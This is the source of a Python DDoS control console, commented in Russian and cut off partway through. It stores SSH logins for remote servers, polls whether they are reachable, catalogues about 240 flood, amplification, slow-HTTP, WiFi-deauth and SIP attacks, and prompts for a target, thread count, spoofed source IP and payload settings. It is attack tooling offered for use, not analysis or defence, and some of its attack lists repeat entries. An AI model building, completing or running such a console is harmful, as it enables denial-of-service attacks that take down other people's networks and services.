import json
import os
import paramiko
import time
from typing import Dict, List
import socket
import threading
from datetime import datetime
import base64
from cryptography.fernet import Fernet

class DDoSConsole:
    def __init__(self):
        self.config_file = "config.json"  # Основной файл конфигурации
        self.template_file = "servers_template.json"  # Шаблон для новых серверов
        self.logs_dir = "logs"
        self.key_file = "encryption.key"  # Файл для хранения ключа шифрования
        
        # Создаем необходимые директории
        if not os.path.exists(self.logs_dir):
            os.makedirs(self.logs_dir)
            
        # Загружаем или создаем ключ шифрования
        self.encryption_key = self.load_or_create_key()
        
        # Создаем шаблон файла, если его нет
        if not os.path.exists(self.template_file):
            self.create_template_file()
            
        # Инициализируем список серверов
        self.servers = []
        
        # Загружаем серверы из конфигурации
        try:
            self.servers = self.load_servers()
        except Exception as e:
            print(f"Ошибка при загрузке конфигурации: {str(e)}")
            # Создаем пустой файл конфигурации, если его нет
            if not os.path.exists(self.config_file):
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    json.dump({"servers": []}, f, indent=4, ensure_ascii=False)
                print(f"Создан новый файл конфигурации: {self.config_file}")
        
        # Автоматически загружаем серверы из шаблона, если они есть
        self.auto_load_servers_from_template()
        
        # Определяем категории атак
        self.attack_categories = {
            "1": "Флуд атаки",
            "2": "Амплификация атак",
            "3": "Медленные атаки",
            "4": "TCP атаки",
            "5": "Тестовые атаки",
            "6": "HTTP/HTTPS атаки",
            "7": "DNS атаки",
            "8": "Специальные атаки",
            "9": "VoIP атаки",
            "10": "WiFi атаки",
            "11": "Сетевые протоколы",
            "12": "DoS атаки"
        }
        
        # Определяем атаки по категориям
        self.attack_types = {
            "1": {  # Флуд атаки
                "1": "UDP Flood",
                "2": "TCP SYN Flood",
                "3": "HTTP Flood",
                "4": "ICMP Flood",
                "5": "UDP Amplification Flood",
                "6": "TCP ACK Flood",
                "7": "TCP RST Flood",
                "8": "TCP Window Flood",
                "9": "TCP Fragment Flood",
                "10": "TCP XMAS Flood",
                "11": "TCP NULL Flood",
                "12": "TCP FIN Flood",
                "13": "TCP URG Flood",
                "14": "UDP Fragment Flood",
                "15": "UDP Custom Flood",
                "16": "UDP Random Flood",
                "17": "UDP Spoofed Flood",
                "18": "UDP Amplified Flood",
                "19": "UDP Reflection Flood",
                "20": "UDP Flood with Custom Payload"
            },
            "2": {  # Амплификация атак
                "1": "DNS Amplification",
                "2": "NTP Amplification",
                "3": "Memcached Amplification",
                "4": "SSDP Amplification",
                "5": "SNMP Amplification",
                "6": "CLDAP Amplification",
                "7": "Chargen Amplification",
                "8": "RIPv1 Amplification",
                "9": "QOTD Amplification",
                "10": "Quake Network Protocol Amplification",
                "11": "LDAP Amplification",
                "12": "RPC Amplification",
                "13": "TFTP Amplification",
                "14": "MSSQL Amplification",
                "15": "NetBIOS Amplification",
                "16": "SSH Amplification",
                "17": "Telnet Amplification",
                "18": "VNC Amplification",
                "19": "RDP Amplification",
                "20": "SIP Amplification"
            },
            "3": {  # Медленные атаки
                "1": "Slowloris",
                "2": "Slow POST",
                "3": "Slow Read",
                "4": "Slow HTTP POST",
                "5": "Slow HTTP Read",
                "6": "Slow HTTP Headers",
                "7": "Slow HTTP Cookies",
                "8": "Slow HTTP Range",
                "9": "Slow HTTP Range with Ranges",
                "10": "Slow HTTP Range with Multiple Ranges",
                "11": "Slow HTTP Keep-Alive",
                "12": "Slow HTTP Pipeline",
                "13": "Slow HTTP Chunked",
                "14": "Slow HTTP Compression",
                "15": "Slow HTTP WebSocket",
                "16": "Slow HTTP/2 Stream",
                "17": "Slow HTTP/2 Priority",
                "18": "Slow HTTP/2 Push",
                "19": "Slow HTTP/2 Settings",
                "20": "Slow HTTP/2 Window"
            },
            "4": {  # TCP атаки
                "1": "TCP ACK Flood",
                "2": "TCP RST Flood",
                "3": "TCP Window Flood",
                "4": "TCP Fragment Flood",
                "5": "TCP XMAS Flood",
                "6": "TCP NULL Flood",
                "7": "TCP FIN Flood",
                "8": "TCP URG Flood",
                "9": "TCP SYN Flood with Custom Flags",
                "10": "TCP SYN Flood with Custom Window Size",
                "11": "TCP SYN Flood with Custom TTL",
                "12": "TCP SYN Flood with Custom MSS",
                "13": "TCP SYN Flood with Custom WScale",
                "14": "TCP SYN Flood with Custom Options",
                "15": "TCP SYN Flood with Custom Timestamps",
                "16": "TCP SYN Flood with Custom SACK",
                "17": "TCP SYN Flood with Custom ECN",
                "18": "TCP SYN Flood with Custom CWR",
                "19": "TCP SYN Flood with Custom ECE",
                "20": "TCP SYN Flood with Custom URG"
            },
            "5": {  # Тестовые атаки
                "1": "Ping Test",
                "2": "UDP Test",
                "3": "TCP Test",
                "4": "HTTP Test",
                "5": "DNS Test",
                "6": "ICMP Test",
                "7": "ARP Test",
                "8": "DHCP Test",
                "9": "SNMP Test",
                "10": "SMTP Test",
                "11": "FTP Test",
                "12": "SSH Test",
                "13": "Telnet Test",
                "14": "RDP Test",
                "15": "VNC Test",
                "16": "MySQL Test",
                "17": "PostgreSQL Test",
                "18": "MongoDB Test",
                "19": "Redis Test",
                "20": "Memcached Test"
            },
            "6": {  # HTTP/HTTPS атаки
                "1": "HTTP GET Flood",
                "2": "HTTP POST Flood",
                "3": "HTTP HEAD Flood",
                "4": "HTTP OPTIONS Flood",
                "5": "HTTP PUT Flood",
                "6": "HTTP DELETE Flood",
                "7": "HTTP TRACE Flood",
                "8": "HTTP CONNECT Flood",
                "9": "HTTPS Flood",
                "10": "HTTP/2 Flood",
                "11": "WebSocket Flood",
                "12": "HTTP/2 Server Push Flood",
                "13": "HTTP/2 Stream Flood",
                "14": "HTTP/2 Priority Flood",
                "15": "HTTP/2 Window Flood",
                "16": "HTTP/2 Settings Flood",
                "17": "HTTP/2 Ping Flood",
                "18": "HTTP/2 Go Away Flood",
                "19": "HTTP/2 Reset Stream Flood",
                "20": "HTTP/2 Window Update Flood"
            },
            "7": {  # DNS атаки
                "1": "DNS Query Flood",
                "2": "DNS Response Flood",
                "3": "DNS Recursive Query Flood",
                "4": "DNS Zone Transfer Flood",
                "5": "DNS ANY Query Flood",
                "6": "DNS NOTIFY Flood",
                "7": "DNS Update Flood",
                "8": "DNS Dynamic Update Flood",
                "9": "DNS Cache Poisoning",
                "10": "DNS NXDOMAIN Flood",
                "11": "DNS Random Subdomain Flood",
                "12": "DNS Water Torture Attack",
                "13": "DNS Phantom Domain Attack",
                "14": "DNS Random Label Attack",
                "15": "DNS DNSSEC Flood",
                "16": "DNS TSIG Flood",
                "17": "DNS AXFR Flood",
                "18": "DNS IXFR Flood",
                "19": "DNS NOTIFY Flood",
                "20": "DNS Dynamic Update Flood"
            },
            "8": {  # Специальные атаки
                "1": "SSL/TLS Renegotiation",
                "2": "SSL/TLS Handshake Flood",
                "3": "SSL/TLS Record Flood",
                "4": "SSL/TLS Alert Flood",
                "5": "SSL/TLS Change Cipher Spec Flood",
                "6": "SSL/TLS Application Data Flood",
                "7": "SSL/TLS Heartbeat Flood",
                "8": "SSL/TLS Session Ticket Flood",
                "9": "SSL/TLS Certificate Flood",
                "10": "SSL/TLS Client Hello Flood",
                "11": "SSL/TLS Server Hello Flood",
                "12": "SSL/TLS Certificate Request Flood",
                "13": "SSL/TLS Server Key Exchange Flood",
                "14": "SSL/TLS Server Hello Done Flood",
                "15": "SSL/TLS Client Key Exchange Flood",
                "16": "SSL/TLS Finished Flood",
                "17": "SSL/TLS New Session Ticket Flood",
                "18": "SSL/TLS Encrypted Handshake Message Flood",
                "19": "SSL/TLS Certificate Status Flood",
                "20": "SSL/TLS Supplemental Data Flood"
            },
            "9": {  # VoIP атаки
                "1": "SIP INVITE Flood",
                "2": "SIP REGISTER Flood",
                "3": "SIP OPTIONS Flood",
                "4": "SIP BYE Flood",
                "5": "SIP CANCEL Flood",
                "6": "SIP ACK Flood",
                "7": "SIP NOTIFY Flood",
                "8": "SIP SUBSCRIBE Flood",
                "9": "SIP PUBLISH Flood",
                "10": "SIP MESSAGE Flood",
                "11": "SIP INFO Flood",
                "12": "SIP PRACK Flood",
                "13": "SIP UPDATE Flood",
                "14": "SIP REFER Flood",
                "15": "SIP NOTIFY Flood",
                "16": "SIP SUBSCRIBE Flood",
                "17": "SIP PUBLISH Flood",
                "18": "SIP MESSAGE Flood",
                "19": "SIP INFO Flood",
                "20": "SIP PRACK Flood"
            },
            "10": {  # WiFi атаки
                "1": "WiFi Deauth Flood",
                "2": "WiFi Disassoc Flood",
                "3": "WiFi Probe Flood",
                "4": "WiFi Auth Flood",
                "5": "WiFi Assoc Flood",
                "6": "WiFi Beacon Flood",
                "7": "WiFi Null Flood",
                "8": "WiFi RTS Flood",
                "9": "WiFi CTS Flood",
                "10": "WiFi ACK Flood",
                "11": "WiFi Block Ack Flood",
                "12": "WiFi CF End Flood",
                "13": "WiFi CF End Ack Flood",
                "14": "WiFi PS Poll Flood",
                "15": "WiFi RTS Flood",
                "16": "WiFi CTS Flood",
                "17": "WiFi ACK Flood",
                "18": "WiFi Block Ack Flood",
                "19": "WiFi CF End Flood",
                "20": "WiFi CF End Ack Flood"
            },
            "11": {  # Сетевые протоколы
                "1": "ARP Flood",
                "2": "DHCP Flood",
                "3": "IGMP Flood",
                "4": "MLD Flood",
                "5": "PIM Flood",
                "6": "OSPF Flood",
                "7": "BGP Flood",
                "8": "RIP Flood",
                "9": "EIGRP Flood",
                "10": "ISIS Flood",
                "11": "MPLS Flood",
                "12": "VXLAN Flood",
                "13": "GRE Flood",
                "14": "IPSec Flood",
                "15": "L2TP Flood",
                "16": "PPTP Flood",
                "17": "MPLS Flood",
                "18": "VXLAN Flood",
                "19": "GRE Flood",
                "20": "IPSec Flood"
            },
            "12": {  # DoS атаки
                "1": "Resource Exhaustion",
                "2": "CPU Exhaustion",
                "3": "Memory Exhaustion",
                "4": "Disk Space Exhaustion",
                "5": "Network Bandwidth Exhaustion",
                "6": "Connection Pool Exhaustion",
                "7": "File Descriptor Exhaustion",
                "8": "Process Table Exhaustion",
                "9": "Thread Pool Exhaustion",
                "10": "Socket Pool Exhaustion",
                "11": "Buffer Overflow",
                "12": "Stack Overflow",
                "13": "Heap Overflow",
                "14": "Integer Overflow",
                "15": "Format String",
                "16": "Race Condition",
                "17": "Deadlock",
                "18": "Livelock",
                "19": "Resource Leak",
                "20": "Memory Leak"
            }
        }
        
        self.running = True
        # Запускаем фоновую проверку статуса
        self.status_thread = threading.Thread(target=self.background_status_check)
        self.status_thread.daemon = True
        self.status_thread.start()

    def encrypt_password(self, password: str) -> str:
        """Шифрование пароля"""
        try:
            if not password:
                return ""
            if password.startswith('gAAAAAB'):  # Если пароль уже зашифрован
                return password
            f = Fernet(self.encryption_key)
            return f.encrypt(password.encode()).decode()
        except Exception as e:
            print(f"[ERROR] Ошибка при шифровании пароля: {str(e)}")
            return password

    def decrypt_password(self, encrypted_password: str) -> str:
        """Расшифрование пароля"""
        try:
            if not encrypted_password:
                return ""
            if not encrypted_password.startswith('gAAAAAB'):  # Если пароль не зашифрован
                return encrypted_password
            f = Fernet(self.encryption_key)
            return f.decrypt(encrypted_password.encode()).decode()
        except Exception as e:
            print(f"[ERROR] Ошибка при расшифровке пароля: {str(e)}")
            return encrypted_password

    def background_status_check(self):
        """Фоновая проверка статуса серверов каждые 60 секунд"""
        while self.running:
            time.sleep(60)  # Проверяем каждую минуту
            if self.running:  # Повторная проверка после сна
                self.update_server_status(silent=True)

    def load_servers(self) -> List[Dict]:
        """Загрузка серверов из конфигурационного файла"""
        try:
            if not os.path.exists(self.config_file):
                return []
                
            with open(self.config_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                servers = []
                
                if isinstance(data, dict) and "servers" in data:
                    for server_data in data["servers"]:
                        try:
                            # Получаем пароль как есть, без расшифровки
                            password = server_data.get("password", "")
                            
                            server = {
                                "name": server_data.get("name", ""),
                                "host": server_data.get("host", ""),
                                "port": server_data.get("port", 22),
                                "username": server_data.get("username", ""),
                                "password": password,  # Используем пароль как есть
                                "status": server_data.get("status", "offline")
                            }
                            
                            if server["host"] and server["username"] and server["password"]:
                                servers.append(server)
                        except Exception as e:
                            print(f"Ошибка при загрузке сервера {server_data.get('name', 'unknown')}: {str(e)}")
                            continue
                
                print(f"Загружено серверов: {len(servers)}")
                return servers
                
        except Exception as e:
            print(f"Ошибка при чтении файла конфигурации: {str(e)}")
            return []

    def save_servers(self, silent=False):
        try:
            servers_list = []
            for server in self.servers:
                server_data = {
                    "name": server["name"],
                    "host": server["host"],
                    "port": server["port"],
                    "username": server["username"],
                    "password": server["password"],  # Сохраняем пароль как есть
                    "status": server.get("status", "offline")
                }
                servers_list.append(server_data)
            
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump({"servers": servers_list}, f, indent=4, ensure_ascii=False)
            if not silent:
                print(f"Сохранено серверов: {len(servers_list)}")
        except Exception as e:
            print(f"Ошибка при сохранении конфигурации: {str(e)}")

    def check_server_status(self, host: str, port: int = 22, silent=False) -> bool:
        try:
            if not silent:
                print(f"\nПроверка {host}:")
            
            # Проверяем SSH порт
            if not silent:
                print("  Проверка SSH порта...", end=" ")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                if not silent:
                    print("порт открыт")
                    print("  Проверка SSH подключения...", end=" ")
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Получаем данные сервера
                    server_data = next((s for s in self.servers if s["host"] == host), None)
                    if not server_data:
                        if not silent:
                            print("ошибка: сервер не найден в списке")
                        return False
                        
                    # Проверяем учетные данные
                    username = server_data.get("username", "root")
                    password = server_data.get("password", "")
                    
                    if not password:
                        if not silent:
                            print("ошибка: пароль не указан")
                        return False
                    
                    # Расшифровываем пароль перед использованием
                    decrypted_password = self.decrypt_password(password)
                    
                    try:
                        ssh.connect(
                            host,
                            port=port,
                            username=username,
                            password=decrypted_password,
                            timeout=10,
                            banner_timeout=10
                        )
                        ssh.close()
                        if not silent:
                            print("успешно")
                        return True
                    except paramiko.AuthenticationException:
                        if not silent:
                            print(f"ошибка: неверные учетные данные (пользователь: {username})")
                        return False
                    except Exception as e:
                        if not silent:
                            print(f"ошибка: {str(e)}")
                        return False
                except Exception as e:
                    if not silent:
                        print(f"ошибка: {str(e)}")
                    return False
            else:
                if not silent:
                    print(f"порт закрыт (код: {result})")
                return False
        except Exception as e:
            if not silent:
                print(f"  Ошибка проверки: {str(e)}")
            return False

    def get_server_password(self, host: str) -> str:
        """Получаем пароль сервера из списка"""
        for server in self.servers:
            if server["host"] == host:
                # Возвращаем расшифрованный пароль
                return self.decrypt_password(server["password"])
        return ""

    def update_server_status(self, silent=False):
        """
        Обновляет статус всех серверов
        :param silent: Если True, не выводит сообщения о процессе проверки
        """
        if not silent:
            print("\nПроверка статуса серверов...")
        
        for server in self.servers:
            if isinstance(server, dict) and "host" in server and "port" in server:
                if not silent:
                    print(f"\nСервер: {server['name']} ({server['host']})")
                    print(f"  Пользователь: {server.get('username', 'root')}")
                
                old_status = server.get("status", "offline")
                server["status"] = "online" if self.check_server_status(server["host"], server["port"], silent) else "offline"
                
                # Выводим сообщение только при изменении статуса в тихом режиме
                if silent and old_status != server["status"]:
                    status_color = "\033[92m" if server["status"] == "online" else "\033[91m"
                    print(f"\nСтатус сервера {server['name']} изменился: {status_color}{server['status']}\033[0m")
                elif not silent:
                    status_color = "\033[92m" if server["status"] == "online" else "\033[91m"
                    print(f"  Итоговый статус: {status_color}{server['status']}\033[0m")
        
        self.save_servers(silent=True)  # Тихое сохранение при обновлении статуса
        if not silent:
            print("\nПроверка завершена!")

    def add_server(self):
        print("\nДобавление нового сервера:")
        name = input("Введите имя сервера: ")
        host = input("Введите IP адрес: ")
        port = int(input("Введите порт SSH (по умолчанию 22): ") or "22")
        username = input("Введите имя пользователя: ")
        password = input("Введите пароль: ")

        server = {
            "name": name,
            "host": host,
            "port": port,
            "username": username,
            "password": password,  # Храним оригинальный пароль в памяти
            "status": "offline"
        }
        self.servers.append(server)
        self.save_servers()
        print(f"Сервер {name} успешно добавлен!")

    def list_servers(self):
        if not self.servers:
            print("\nНет доступных серверов!")
            return

        # Фильтруем только онлайн серверы
        online_servers = [s for s in self.servers if s.get("status") == "online"]
        
        if not online_servers:
            print("\nНет доступных онлайн серверов!")
            return

        print("\nДоступные серверы:")
        print("(Если не выбрать сервер, будут использованы все онлайн сервера)")
        for i, server in enumerate(online_servers, 1):
            if isinstance(server, dict) and "name" in server and "host" in server:
                print(f"{i}. {server['name']} ({server['host']}) - \033[92monline\033[0m")
        print("\n0. Назад")

    def list_attack_categories(self):
        """Вывод списка категорий атак"""
        print("\nКатегории атак:")
        for key, value in self.attack_categories.items():
            print(f"{key}. {value}")

    def list_attack_types(self, category: str):
        """Вывод списка атак в выбранной категории"""
        print(f"\nАтаки в категории '{self.attack_categories[category]}':")
        for key, value in self.attack_types[category].items():
            print(f"{key}. {value}")

    def get_attack_type(self, category: str, attack_id: str) -> str:
        """Получение полного идентификатора атаки"""
        return f"{category}_{attack_id}"

    def get_attack_parameters(self, category: str, attack_id: str) -> dict:
        """Получение дополнительных параметров для атаки"""
        params = {}
        attack_name = self.attack_types[category][attack_id]
        
        print(f"\n[INFO] Настройка параметров для атаки: {attack_name}")
        print("(Нажмите Enter для использования значений по умолчанию)")
        
        # Базовый параметр - IP или домен цели
        while True:
            target = input("\nВведите цель атаки (IP или домен): ").strip()
            if not target:
                print("[ERROR] Цель атаки не может быть пустой!")
                continue
            if target.lower() in ['localhost', '127.0.0.1']:
                print("[WARNING] Атака на localhost может быть опасна для вашей системы!")
                confirm = input("Вы уверены? (y/n): ").strip().lower()
                if confirm != 'y':
                    continue
            params["target"] = target
            break
        
        # Общие параметры для всех атак
        print("\n[INFO] Настройка общих параметров:")
        while True:
            try:
                threads = input("Количество потоков [100]: ").strip() or "100"
                threads = int(threads)
                if threads <= 0:
                    print("[ERROR] Количество потоков должно быть положительным числом!")
                    continue
                if threads > 1000:
                    print("[WARNING] Большое количество потоков может перегрузить систему!")
                    confirm = input("Вы уверены? (y/n): ").strip().lower()
                    if confirm != 'y':
                        continue
                params["threads"] = str(threads)
                break
            except ValueError:
                print("[ERROR] Введите корректное число!")
        
        while True:
            try:
                timeout = input("Таймаут в секундах [5]: ").strip() or "5"
                timeout = int(timeout)
                if timeout <= 0:
                    print("[ERROR] Таймаут должен быть положительным числом!")
                    continue
                params["timeout"] = str(timeout)
                break
            except ValueError:
                print("[ERROR] Введите корректное число!")
        
        # Дополнительные параметры в зависимости от типа атаки
        print(f"\n[INFO] Настройка специфических параметров для {attack_name}:")
        
        if "HTTP" in attack_name:
            while True:
                try:
                    port = input("Порт [80]: ").strip() or "80"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            if "HTTPS" in attack_name:
                params["port"] = "443"
            
            params["path"] = input("Путь [/]: ").strip() or "/"
            params["method"] = input("HTTP метод [GET]: ").strip().upper() or "GET"
            
            if params["method"] not in ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE", "CONNECT"]:
                print("[WARNING] Нестандартный HTTP метод!")
                confirm = input("Вы уверены? (y/n): ").strip().lower()
                if confirm != 'y':
                    params["method"] = "GET"
            
            headers = input("Дополнительные заголовки (через запятую): ").strip()
            if headers:
                params["headers"] = headers
            
            if params["method"] == "POST":
                data = input("POST данные: ").strip()
                if data:
                    params["data"] = data
            
            if "HTTP/2" in attack_name:
                while True:
                    try:
                        streams = input("Количество HTTP/2 потоков [100]: ").strip() or "100"
                        streams = int(streams)
                        if streams <= 0:
                            print("[ERROR] Количество потоков должно быть положительным числом!")
                            continue
                        params["streams"] = str(streams)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        priority = input("Приоритет потока (0-256) [0]: ").strip() or "0"
                        priority = int(priority)
                        if priority < 0 or priority > 256:
                            print("[ERROR] Приоритет должен быть в диапазоне 0-256!")
                            continue
                        params["priority"] = str(priority)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "DNS" in attack_name:
            while True:
                try:
                    port = input("Порт DNS [53]: ").strip() or "53"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            params["query_type"] = input("Тип запроса [A]: ").strip().upper() or "A"
            if params["query_type"] not in ["A", "AAAA", "MX", "NS", "SOA", "TXT", "ANY"]:
                print("[WARNING] Нестандартный тип DNS запроса!")
                confirm = input("Вы уверены? (y/n): ").strip().lower()
                if confirm != 'y':
                    params["query_type"] = "A"
            
            params["domain"] = input("Домен для запроса: ").strip()
            if not params["domain"]:
                print("[ERROR] Домен не может быть пустым!")
                params["domain"] = "example.com"
            
            if "Recursive" in attack_name:
                params["recursive"] = "1"
            if "ANY" in attack_name:
                params["any_query"] = "1"
            if "NXDOMAIN" in attack_name:
                params["nxdomain"] = "1"
            if "Random Subdomain" in attack_name:
                params["random_subdomain"] = "1"
                while True:
                    try:
                        length = input("Длина случайного поддомена [10]: ").strip() or "10"
                        length = int(length)
                        if length <= 0:
                            print("[ERROR] Длина должна быть положительным числом!")
                            continue
                        params["subdomain_length"] = str(length)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "TCP" in attack_name:
            while True:
                try:
                    port = input("Порт [80]: ").strip() or "80"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            if "SYN" in attack_name:
                while True:
                    try:
                        window = input("Размер окна [65535]: ").strip() or "65535"
                        window = int(window)
                        if window <= 0:
                            print("[ERROR] Размер окна должен быть положительным числом!")
                            continue
                        params["window_size"] = str(window)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        ttl = input("TTL [64]: ").strip() or "64"
                        ttl = int(ttl)
                        if ttl <= 0 or ttl > 255:
                            print("[ERROR] TTL должен быть в диапазоне 1-255!")
                            continue
                        params["ttl"] = str(ttl)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        mss = input("MSS [1460]: ").strip() or "1460"
                        mss = int(mss)
                        if mss <= 0:
                            print("[ERROR] MSS должен быть положительным числом!")
                            continue
                        params["mss"] = str(mss)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        wscale = input("Window Scale (0-14) [0]: ").strip() or "0"
                        wscale = int(wscale)
                        if wscale < 0 or wscale > 14:
                            print("[ERROR] Window Scale должен быть в диапазоне 0-14!")
                            continue
                        params["wscale"] = str(wscale)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Fragment" in attack_name:
                while True:
                    try:
                        size = input("Размер фрагмента [8]: ").strip() or "8"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер фрагмента должен быть положительным числом!")
                            continue
                        params["fragment_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Custom Flags" in attack_name:
                flags = input("TCP флаги (например, SYN,ACK,RST): ").strip()
                if flags:
                    params["flags"] = flags
        
        elif "UDP" in attack_name:
            while True:
                try:
                    port = input("Порт [80]: ").strip() or "80"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            while True:
                try:
                    size = input("Размер пакета [1024]: ").strip() or "1024"
                    size = int(size)
                    if size <= 0:
                        print("[ERROR] Размер пакета должен быть положительным числом!")
                        continue
                    params["packet_size"] = str(size)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            if "Fragment" in attack_name:
                while True:
                    try:
                        size = input("Размер фрагмента [8]: ").strip() or "8"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер фрагмента должен быть положительным числом!")
                            continue
                        params["fragment_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Custom" in attack_name:
                payload = input("Пользовательские данные: ").strip()
                if payload:
                    params["payload"] = payload
            
            if "Random" in attack_name:
                while True:
                    try:
                        size = input("Максимальный размер случайных данных [1024]: ").strip() or "1024"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер должен быть положительным числом!")
                            continue
                        params["random_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Spoofed" in attack_name:
                spoof_ip = input("IP для спуфинга: ").strip()
                if spoof_ip:
                    params["spoof_ip"] = spoof_ip
        
        elif "VoIP" in attack_name or "SIP" in attack_name:
            while True:
                try:
                    port = input("Порт SIP [5060]: ").strip() or "5060"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            params["caller"] = input("Номер звонящего: ").strip()
            params["callee"] = input("Номер вызываемого: ").strip()
            params["sip_version"] = input("Версия SIP [2.0]: ").strip() or "2.0"
            params["user_agent"] = input("User-Agent: ").strip()
            
            if "REGISTER" in attack_name:
                while True:
                    try:
                        expires = input("Время жизни регистрации в секундах [3600]: ").strip() or "3600"
                        expires = int(expires)
                        if expires <= 0:
                            print("[ERROR] Время жизни должно быть положительным числом!")
                            continue
                        params["expires"] = str(expires)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "WiFi" in attack_name:
            params["bssid"] = input("BSSID цели: ").strip()
            while True:
                try:
                    channel = input("Канал (1-13) [1]: ").strip() or "1"
                    channel = int(channel)
                    if channel < 1 or channel > 13:
                        print("[ERROR] Канал должен быть в диапазоне 1-13!")
                        continue
                    params["channel"] = str(channel)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            params["ssid"] = input("SSID цели: ").strip()
            
            if "Deauth" in attack_name or "Disassoc" in attack_name:
                params["client_mac"] = input("MAC-адрес клиента (опционально): ").strip()
            
            if "Probe" in attack_name:
                while True:
                    try:
                        interval = input("Интервал между пробами в мс [100]: ").strip() or "100"
                        interval = int(interval)
                        if interval <= 0:
                            print("[ERROR] Интервал должен быть положительным числом!")
                            continue
                        params["probe_interval"] = str(interval)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "SSL/TLS" in attack_name:
            while True:
                try:
                    port = input("Порт [443]: ").strip() or "443"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            version = input("Версия SSL/TLS [1.2]: ").strip() or "1.2"
            if version not in ["1.0", "1.1", "1.2", "1.3"]:
                print("[WARNING] Нестандартная версия SSL/TLS!")
                confirm = input("Вы уверены? (y/n): ").strip().lower()
                if confirm != 'y':
                    version = "1.2"
            params["version"] = version
            
            params["cipher_suite"] = input("Набор шифров (опционально): ").strip()
            
            if "Renegotiation" in attack_name:
                while True:
                    try:
                        interval = input("Интервал пересогласования в мс [100]: ").strip() or "100"
                        interval = int(interval)
                        if interval <= 0:
                            print("[ERROR] Интервал должен быть положительным числом!")
                            continue
                        params["renegotiation_interval"] = str(interval)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Heartbeat" in attack_name:
                while True:
                    try:
                        size = input("Размер heartbeat [16384]: ").strip() or "16384"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер должен быть положительным числом!")
                            continue
                        params["heartbeat_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "Slow" in attack_name:
            while True:
                try:
                    port = input("Порт [80]: ").strip() or "80"
                    port = int(port)
                    if port <= 0 or port > 65535:
                        print("[ERROR] Порт должен быть в диапазоне 1-65535!")
                        continue
                    params["port"] = str(port)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            while True:
                try:
                    connections = input("Количество соединений [1000]: ").strip() or "1000"
                    connections = int(connections)
                    if connections <= 0:
                        print("[ERROR] Количество соединений должно быть положительным числом!")
                        continue
                    params["connections"] = str(connections)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            while True:
                try:
                    interval = input("Интервал между запросами в мс [100]: ").strip() or "100"
                    interval = int(interval)
                    if interval <= 0:
                        print("[ERROR] Интервал должен быть положительным числом!")
                        continue
                    params["interval"] = str(interval)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            if "POST" in attack_name:
                while True:
                    try:
                        length = input("Content-Length [1000000]: ").strip() or "1000000"
                        length = int(length)
                        if length <= 0:
                            print("[ERROR] Content-Length должен быть положительным числом!")
                            continue
                        params["content_length"] = str(length)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Range" in attack_name:
                while True:
                    try:
                        start = input("Начальное значение Range [0]: ").strip() or "0"
                        start = int(start)
                        if start < 0:
                            print("[ERROR] Начальное значение должно быть неотрицательным!")
                            continue
                        params["range_start"] = str(start)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        end = input("Конечное значение Range [1000000]: ").strip() or "1000000"
                        end = int(end)
                        if end <= start:
                            print("[ERROR] Конечное значение должно быть больше начального!")
                            continue
